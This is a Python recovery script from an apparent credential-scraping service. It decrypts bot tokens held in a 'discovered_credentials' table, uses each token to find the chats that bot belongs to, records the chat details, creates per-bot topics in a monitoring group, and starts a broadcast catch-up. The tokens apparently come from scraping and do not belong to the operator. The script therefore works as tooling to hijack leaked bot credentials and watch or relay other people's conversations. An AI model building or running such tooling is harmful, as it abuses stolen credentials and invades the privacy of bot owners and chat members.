import asyncio
import os
import sys
import logging
from datetime import datetime, timezone

# Ensure project root is in path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.core.config import settings
from app.core.database import db
from app.services.broadcaster_srv import BroadcasterService
from app.workers.tasks.flow_tasks import _broadcast_logic

# Configure Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("self_heal_sync")

async def self_heal():
    print("🩹 [Self-Heal] Starting system-wide sync and recovery...")
    
    broadcaster = BroadcasterService()
    
    # 1. Fetch all active or pending credentials
    try:
        response = db.table("discovered_credentials")\
            .select("*")\
            .in_("status", ["active", "pending"])\
            .execute()
        credentials = response.data
    except Exception as e:
        print(f"    ❌ DB Error: {e}")
        return

    print(f"    📊 Found {len(credentials)} credentials. Checking for missing chat_ids or topics...")

    heal_count = 0
    from app.services.scraper_srv import scraper_service
    from app.core.security import security

    for cred in credentials:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        chat_id = cred.get("chat_id")
        topic_id = meta.get("topic_id")
        status = cred.get("status")

        # A. HEAL MISSING CHAT_ID
        if not chat_id:
            print(f"    🔍 [Self-Heal] Missing chat_id for {cred_id}. Attempting discovery...")
            try:
                # Decrypt token
                raw_token = cred["bot_token"]
                if raw_token.startswith("gAAAA"):
                    bot_token = security.decrypt(raw_token)
                else:
                    bot_token = raw_token
                
                bot_info, chats = await scraper_service.discover_chats(bot_token)
                if chats:
                    # Update with first chat found
                    first = chats[0]
                    chat_id = first["id"]
                    meta.update({
                        "chat_name": first["name"],
                        "chat_type": first["type"],
                        "bot_username": bot_info.get("username"),
                        "bot_id": bot_info.get("id"),
                        "healed_chat_at": datetime.now(timezone.utc).isoformat()
                    })
                    db.table("discovered_credentials").update({
                        "chat_id": chat_id,
                        "meta": meta,
                        "status": "active"
                    }).eq("id", cred_id).execute()
                    print(f"    ✅ Recovered Chat ID: {chat_id} ({first['name']})")
                else:
                    print(f"    ⚠️ No chats found for {cred_id}. Bot might be idle.")
            except Exception as e:
                print(f"    ❌ Chat discovery failed for {cred_id}: {e}")

        # B. HEAL MISSING TOPIC_ID (Only if we have chat_id now)
        if chat_id:
            bot_username = meta.get("bot_username", "unknown")
            bot_id = meta.get("bot_id", "0")
            topic_name = f"@{bot_username} / {bot_id}"

            if not topic_id or topic_id == 0:
                print(f"    🩹 Healing Topic for CredID: {cred_id} ({topic_name})...")
                try:
                    new_topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                    meta["topic_id"] = new_topic_id
                    meta["healed_at"] = datetime.now(timezone.utc).isoformat()
                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                    print(f"    ✅ Recovered Topic ID: {new_topic_id}")
                    heal_count += 1
                except Exception as e:
                    print(f"    ❌ Failed to heal {cred_id}: {e}")

    print(f"🏁 Topic healing complete. Repaired {heal_count} records.")

    # 2. Trigger Broadcast Logic
    print("\n🚀 [Self-Heal] Triggering full broadcast catch-up...")
    try:
        # We manually run the broadcast logic to clear any pending messages
        # No need to check for locks here as _broadcast_logic is idempotent
        result = await _broadcast_logic()
        print(f"✅ Broadcast Result: {result}")
    except Exception as e:
        print(f"❌ Broadcast Fail: {e}")

    print("\n✨ [Self-Heal] System recovery finished.")

if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(self_heal())
